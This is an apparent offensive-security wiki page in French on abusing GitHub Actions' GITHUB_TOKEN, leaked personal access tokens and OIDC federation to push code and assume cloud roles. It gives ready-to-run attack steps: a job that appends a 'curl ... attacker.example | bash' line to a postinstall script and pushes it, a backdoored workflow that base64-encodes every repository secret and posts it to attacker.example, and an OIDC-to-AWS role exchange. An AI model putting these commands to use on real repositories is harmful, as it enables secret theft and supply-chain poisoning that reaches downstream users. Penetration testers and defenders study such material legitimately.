---
title: "Abus de token et de GITHUB_TOKEN : transformer les tokens CI et les PAT fuités en poussées et en rôles cloud"
order: 3
description: "Utiliser le GITHUB_TOKEN d'Actions et son cadrage de permissions, le scope workflow qui permet de pousser des pipelines malveillants, les personal access tokens classiques et fine-grained fuités, lire les scopes accordés dans les en-têtes de réponse, et échanger un token OIDC contre un rôle cloud."
keywords:
  - GITHUB_TOKEN
  - personal access token
  - X-OAuth-Scopes
  - workflow scope
  - OIDC cloud role
---

# Abus de token et de GITHUB_TOKEN

Chaque action contre GitHub passe par un token, et l'essentiel de l'attaque consiste à apprendre **quel token vous détenez, à quoi il est cadré et jusqu'où ce cadrage s'étend**. Trois familles de tokens comptent : le `GITHUB_TOKEN` injecté automatiquement dans une exécution de workflow, les personal access tokens (PAT) trouvés dans la nature, et le token OIDC à durée de vie courte qu'un workflow peut échanger contre des identifiants cloud.

## Lire ce qu'un token peut faire

Avant d'utiliser un token, prenez son empreinte. Un PAT classique annonce ses scopes dans un en-tête de réponse ; c'est l'appel le plus utile que l'on puisse faire contre n'importe quel token `ghp_`/`gho_` que vous trouvez :

```bash
curl -sI -H "Authorization: token $TOKEN" https://api.github.com/user \
  | grep -iE '^(x-oauth-scopes|x-accepted-oauth-scopes):'
# x-oauth-scopes: repo, workflow, admin:org, read:packages
```

`X-OAuth-Scopes` liste ce que le token porte réellement. `repo` est le contrôle total de chaque dépôt auquel l'utilisateur peut accéder ; `workflow` autorise en plus l'écriture dans `.github/workflows/` ; `admin:org` est le contrôle à l'échelle de l'org. Un PAT **fine-grained** (`github_pat_`) renvoie un en-tête de scope vide parce que ses permissions sont par dépôt et par ressource ; sondez-le plutôt ainsi :

```bash
curl -s -H "Authorization: token $TOKEN" https://api.github.com/user   # whoami
gh api /user/repos --paginate -q '.[] | select(.permissions.push) | .full_name'
```

## GITHUB_TOKEN : permissions par défaut et cadrage

À l'intérieur d'un workflow, `GITHUB_TOKEN` est un token d'installation à durée de vie courte, forgé par exécution et auto-révoqué à la fin du job. Sa puissance est fixée par le défaut du dépôt/de l'org et par tout bloc `permissions:`. Le défaut historique est lecture-écriture sur l'ensemble du dépôt ; le défaut durci est lecture seule, les jobs devant réactiver explicitement les permissions :

```yaml
permissions:
  contents: write        # push commits, tags, releases
  packages: write        # publish to GitHub Packages / GHCR
  id-token: write        # mint an OIDC token for cloud federation
```

Une exécution avec `contents: write` vous permet de pousser vers le dépôt directement depuis le job, ce qui est le point d'ancrage de supply chain le plus rapide une fois que vous avez l'exécution dans un workflow (voir [injection de workflow Actions](actions-workflow-injection.md)) :

```yaml
      - run: |
          git config user.email ci@acme.test && git config user.name ci
          echo 'curl -s https://attacker.example/i|bash' >> scripts/postinstall.sh
          git commit -am "chore: update" && git push
```

Notez que `GITHUB_TOKEN` ne peut pas écrire dans `.github/workflows/` même avec `contents: write` : modifier un workflow requiert le scope `workflow`, que `GITHUB_TOKEN` n'a jamais. Un PAT fuité porteur de `workflow`, en revanche, peut pousser un pipeline malveillant qui s'exécute ensuite avec tous les secrets.

## Utiliser un PAT fuité

Traitez un PAT récupéré comme l'utilisateur qui le possède. Authentifiez chaque appel avec lui et agissez dans la limite de ses scopes :

```bash
# Push a backdoored workflow (needs the `workflow` scope)
git clone https://x-access-token:$TOKEN@github.com/ACME/service.git
cat > service/.github/workflows/ci2.yml <<'YML'
on: [push]
jobs: { x: { runs-on: ubuntu-latest, steps: [ { run: 'echo "${{ toJSON(secrets) }}" | base64 -w0 | curl -s -d @- https://attacker.example/s' } ] } }
YML
cd service && git add -A && git commit -m ci && git push    # the push triggers the run; secrets exfiltrate

# Mint a new PAT-like credential set for persistence where scopes allow
curl -s -H "Authorization: token $TOKEN" https://api.github.com/user/keys   # read deploy/SSH keys
```

Pousser un workflow qui s'exécute `on: [push]` le déclenche immédiatement avec les secrets du dépôt, convertissant un PAT au scope `workflow` en un dump complet des secrets sans attendre un mainteneur.

## Token OIDC vers un rôle cloud

Un workflow avec `id-token: write` peut demander un JWT OIDC signé à GitHub et le présenter à l'endpoint de fédération d'un fournisseur cloud. Là où la politique de confiance du cloud est laxiste (jokers sur le dépôt, la ref ou l'`audience`), vous assumez un rôle sans aucun secret stocké :

```yaml
      - run: |
          # Fetch the OIDC token GitHub offers to the job
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          # Exchange it for AWS credentials against a role trusting this repo
          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::111122223333:role/ci \
            --role-session-name x --web-identity-token "$TOKEN"
```

Les clés renvoyées sont de vrais identifiants cloud. Une politique de confiance qui correspond à `repo:ACME/*` ou à n'importe quelle ref, plutôt qu'à un dépôt et une branche exacts, signifie que tout workflow que vous pouvez exécuter dans l'org atteint ce rôle.

## Suites

- `contents: write` ou un PAT `repo`/`workflow` : pousser des backdoors, taguer des releases empoisonnées, publier des paquets malveillants que les consommateurs en aval récupèrent (supply chain).
- Rôle cloud assumé via OIDC : pivoter dans le compte connecté, voir [l'identité AWS](../../cloud/aws/identity/index.md) et ses chemins d'assomption de rôle.
- PAT `admin:org` : ajouter des membres, changer les permissions d'équipe, installer des Apps et planter un accès durable via [l'abus d'OAuth App et de webhook](oauth-app-and-webhook-abuse.md).
- Clés de déploiement et tokens de registre récupérés en même temps : accès direct à l'infra de build et aux registres d'artefacts.

## Notes d'exploitation

- Lisez toujours `X-OAuth-Scopes` en premier ; c'est le classificateur le plus rapide pour les PAT classiques et cela évite le sondage à l'aveugle.
- Un en-tête de scope vide signifie un PAT fine-grained ou un token de GitHub App ; énumérez plutôt les dépôts accessibles et leurs `permissions`.
- `GITHUB_TOKEN` est puissant mais ne peut pas toucher à `.github/workflows/` et meurt avec le job ; un PAT au scope `workflow` est la primitive durable d'écriture de pipeline.
- Une confiance OIDC cloud laxiste (jokers sur `sub`) est la mauvaise configuration courante qui transforme tout workflow d'org en accès cloud ; vérifiez les conditions `sub` et `aud` de la politique de confiance.

## Outils

- **gh** : s'authentifier avec un token trouvé (`GH_TOKEN=... gh api`) pour énumérer et agir dans la limite de son scope.
- **gato** (Praetorian) : identifie les dépôts où un `GITHUB_TOKEN` ou un PAT atteint des secrets et des runners auto-hébergés.
- **Configure AWS Credentials action** (`aws-actions/configure-aws-credentials`) : implémentation de référence de l'échange OIDC, utile pour comprendre les conditions de confiance.

## Références

- [GitHub : authentification automatique par token et permissions de GITHUB_TOKEN](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)
- [GitHub : à propos du durcissement OIDC pour les déploiements cloud](https://docs.github.com/en/actions/concepts/security/openid-connect)
- [GitHub : scopes pour OAuth et personal access tokens](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/scopes-for-oauth-apps)
- [Rhino Security Labs : évaluer les tokens et scopes GitHub](https://rhinosecuritylabs.com/application-security/github-oauth-to-rce/)
- [Tinder Security Labs : identifier les politiques de confiance OIDC vulnérables de GitHub Actions](https://medium.com/tinder/identifying-vulnerable-github-actions-workflows-c35dfb3f4e9e)
